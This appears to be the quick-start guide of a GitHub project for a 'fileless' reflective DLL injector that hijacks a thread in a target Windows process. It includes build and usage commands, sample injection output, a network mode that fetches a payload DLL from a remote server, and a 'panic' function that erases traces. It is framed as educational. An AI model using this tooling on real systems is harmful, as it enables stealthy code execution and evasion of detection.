# Quick Start Guide

## Prerequisites

Before you begin, ensure you have:
- Windows 10 or Windows 11 (x64)
- Visual Studio 2019 or later with C++ tools, OR MinGW-w64
- CMake 3.15 or later
- Administrator privileges (for testing)

## Building the Project

### Option 1: Using CMake (Recommended)

```bash
# Clone the repository
git clone https://github.com/Squiz69/naujac.git
cd naujac

# Create build directory
mkdir build
cd build

# Configure the project
cmake ..

# Build
cmake --build . --config Release

# Binaries will be in build/Release/
```

### Option 2: Using Visual Studio Command Prompt

```cmd
# Navigate to project directory
cd naujac

# Compile the injector
cl /EHsc /std:c++17 /O2 /I include src\*.cpp /Fe:FilelessDLLLoader.exe ws2_32.lib

# Compile the example payload
cl /LD /EHsc /O2 examples\ExamplePayload.cpp /Fe:ExamplePayload.dll
```

### Option 3: Using MinGW-w64

```bash
# Compile the injector
g++ -std=c++17 -O2 -Iinclude src/*.cpp -o FilelessDLLLoader.exe -lws2_32

# Compile the example payload
g++ -std=c++17 -O2 -shared examples/ExamplePayload.cpp -o ExamplePayload.dll
```

## Testing the Tool

### Step 1: Start a Test Target

Open a simple application like Notepad:
```bash
notepad.exe
```

### Step 2: Run the Injector

```bash
# Using local mode (for testing)
FilelessDLLLoader.exe local ExamplePayload.dll notepad.exe
```

### Step 3: Observe the Results

You should see:
1. Console output showing the injection process
2. A message box from the injected DLL
3. Status information about the injection

### Step 4: Test the Panic Function

When prompted:
- Press **P** to activate the panic/self-erasure function
- Press **Q** to quit without panic

## Example Outputs

### Successful Injection
```
╔══════════════════════════════════════════════════════════════════╗
║          Fileless Reflective DLL Loader v1.0                     ║
║          Thread Execution Hijacking Edition                      ║
╚══════════════════════════════════════════════════════════════════╝

[1/5] Fetching DLL from local file...
[+] Fetched DLL from memory buffer: 24576 bytes

[2/5] Finding target process...
[+] Found target process: notepad.exe (PID: 12345)
[+] Opened target process (PID: 12345)

[3/5] Performing manual PE mapping...
[+] PE validation passed
[+] Allocated memory at: 0x7ff8a0000000
[+] Copied section: .text
[+] Copied section: .data
[+] Copied section: .rdata
[+] Resolving imports from: kernel32.dll
[+] Resolving imports from: user32.dll
[+] Import resolution complete
[+] Relocations applied
[+] Entry point: 0x7ff8a0001234
[+] DLL mapped successfully at: 0x7ff8a0000000

[4/5] Hijacking thread execution...
[+] Found target thread (TID: 67890)
[+] Opened target thread (TID: 67890)
[+] Thread suspended (suspend count: 1)
[+] Captured thread context
[+] Original RIP: 0x7ff9b1234567
[+] Modified thread context
[+] Redirected RIP to: 0x7ff8a0001234
[+] Thread resumed (suspend count: 0)
[+] Thread hijacking successful!

[5/5] ✓ Injection complete!

╔══════════════════════════════════════════════════════════════════╗
║ DLL successfully injected via thread hijacking                   ║
║ Base Address: 0x7ff8a0000000                                     ║
║ Entry Point:  0x7ff8a0001234                                     ║
╚══════════════════════════════════════════════════════════════════╝

[*] Press 'P' to activate PANIC function and self-erase...
[*] Press 'Q' to quit without panic...
```

### Panic Function Activation
```
[!] PANIC FUNCTION INITIATED
[*] Beginning self-erasure sequence...
[+] Thread suspended for context restoration
[+] Original thread context restored
[+] RIP restored to: 0x7ff9b1234567
[+] Thread resumed with original context
[+] Zeroing allocated memory with SecureZeroMemory...
[+] Memory region zeroed: 65536 bytes
[+] Memory region securely zeroed
[+] Freeing remote memory at: 0x7ff8a0000000
[+] Remote memory freed
[+] Clearing operation traces...
[+] Operation traces cleared
[+] PANIC FUNCTION COMPLETED SUCCESSFULLY
[+] All traces erased

[*] Exiting...
```

## Advanced Usage

### Network Mode

To fetch a DLL from a remote server:

```bash
# Start a simple HTTP server (for testing)
python -m http.server 8080

# Run the injector in network mode
FilelessDLLLoader.exe network 127.0.0.1 8080 /ExamplePayload.dll notepad.exe
```

### Custom Payloads

To create your own payload DLL:

1. Create a new C++ file with DllMain:
```cpp
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Your payload code here
        MessageBoxA(NULL, "Custom payload loaded!", "Info", MB_OK);
    }
    return TRUE;
}
```

2. Compile as a DLL:
```bash
cl /LD /EHsc yourpayload.cpp /Fe:yourpayload.dll
```

3. Inject:
```bash
FilelessDLLLoader.exe local yourpayload.dll targetprocess.exe
```

## Troubleshooting

### Error: "Failed to open process"
**Solution**: Run as Administrator
```bash
# Right-click Command Prompt
# Select "Run as Administrator"
```

### Error: "Target process not found"
**Solution**: Ensure the target process is running
```bash
# Check if process is running
tasklist | findstr notepad.exe
```

### Error: "Failed to map DLL"
**Possible causes**:
- DLL has invalid PE format
- Target process has memory protection
- Insufficient memory in target process

**Solutions**:
- Verify DLL is valid: `dumpbin /headers yourpayload.dll`
- Try a different target process
- Check available memory in target

### Error: "Failed to resolve imports"
**Possible causes**:
- DLL uses functions not available on system
- DLL requires specific Windows version

**Solution**: Ensure your DLL only uses common Windows APIs

### Build Errors

**Missing ws2_32.lib**:
```bash
# Ensure you're using Visual Studio Developer Command Prompt
# Or add Windows SDK to your path
```

**C++17 not supported**:
```bash
# Update your compiler
# Or modify CMakeLists.txt to use C++14
```

## Testing in a Safe Environment

### Use a Virtual Machine

For safe testing, always use a VM:

1. **Download VMware or VirtualBox**
2. **Install Windows 10/11**
3. **Create a snapshot** (so you can revert)
4. **Test the injector in the VM**

### Recommended Test Targets

Safe processes to test with:
- `notepad.exe` - Simple text editor
- `calc.exe` - Calculator
- `mspaint.exe` - Paint

**Do NOT test with**:
- System processes (csrss.exe, lsass.exe, etc.)
- Protected processes
- Antivirus processes
- Critical system components

## Best Practices

### 1. Always Test in a VM
Never test on your main system or production machines.

### 2. Use Local Mode First
Test with local DLL files before trying network mode.

### 3. Test with Simple Payloads
Start with the example payload before creating custom ones.

### 4. Monitor System Resources
Use Task Manager to monitor memory and CPU usage.

### 5. Keep Logs
Save console output for debugging:
```bash
FilelessDLLLoader.exe local payload.dll notepad.exe > log.txt 2>&1
```

## Next Steps

After successfully testing:

1. **Read the Architecture** - Understand how it works: [ARCHITECTURE.md](ARCHITECTURE.md)
2. **Review Security** - Learn about detection: [SECURITY.md](SECURITY.md)
3. **Customize** - Create your own payloads
4. **Contribute** - Improve the code or documentation

## Support

For issues or questions:
1. Check the [README.md](README.md) for detailed information
2. Review the documentation files
3. Ensure you're following all legal and ethical guidelines

## Remember

⚠️ **THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY**

- Only use on systems you own
- Only use with explicit written permission
- Follow all applicable laws
- Use responsibly and ethically

## License

This project is licensed under MIT License with educational use restrictions.
See [LICENSE](LICENSE) for details.
